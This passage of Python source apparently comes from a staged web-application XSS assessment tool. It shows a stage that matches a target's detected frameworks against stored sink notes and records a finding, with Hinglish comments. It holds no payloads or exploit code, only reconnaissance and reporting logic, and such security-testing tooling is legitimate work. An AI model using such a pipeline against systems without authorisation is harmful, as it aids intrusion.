    cp.mark(ck, results, summary="technique-matrix %d" % len(records))
    ok("Stage K done: %d technique record(s)" % len(records))
    return results


# ===========================================================================
# STAGE L: FRAMEWORK ENCODING NOTES (0 requests - P6/P7 mined)
# ===========================================================================
def framework_notes_stage(http, scope, F, ctx, conf, targets, meta, cp, base_dir):
    """Stage L: stack -> per-framework sink notes (framework_encoding.json)."""
    ck = "stageL:framework-notes"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"frameworks": [], "notes": {}}
        ok("Stage L replayed (checkpoint): %d frameworks" % len(cached.get("frameworks", [])))
        return cached
    eng_root = os.path.join(base_dir, scope.engagement)
    stack_txt = ""
    for d in (base_dir, eng_root):
        p = os.path.join(d, "tech", "stack_report.txt")
        if os.path.exists(p):
            stack_txt += open(p, errors="ignore").read()[:4000]
    # dom analysis me frameworks bhi
    for rec in ctx.get("dom_records", []):
        for fw in rec.get("frameworks", []):
            stack_txt += " " + fw
    found = []
    for fw in FRAMEWORK_NOTES:
        if re.search(r"(?i)%s" % re.escape(fw), stack_txt):
            found.append(fw)
    res = {"frameworks": found, "notes": {fw: FRAMEWORK_NOTES[fw] for fw in found},
           "stack_snippet": stack_txt[:600]}
    cp.mark(ck, res, summary="framework-notes %d" % len(found))
    if found:
        F.add("xss_framework_sink_note", "Framework encoding context: %s" % ", ".join(found),
              meta.get("origin", "-"),
              "Stack se framework detect hua - inke sink patterns ("
              + "; ".join("%s: %s" % (fw, FRAMEWORK_NOTES[fw][:60]) for fw in found[:3])
              + ") finding-context me check karo.",
              evidence_ref="framework_notes.json")
    ok("Stage L done: %d framework note(s)" % len(found))
    return res
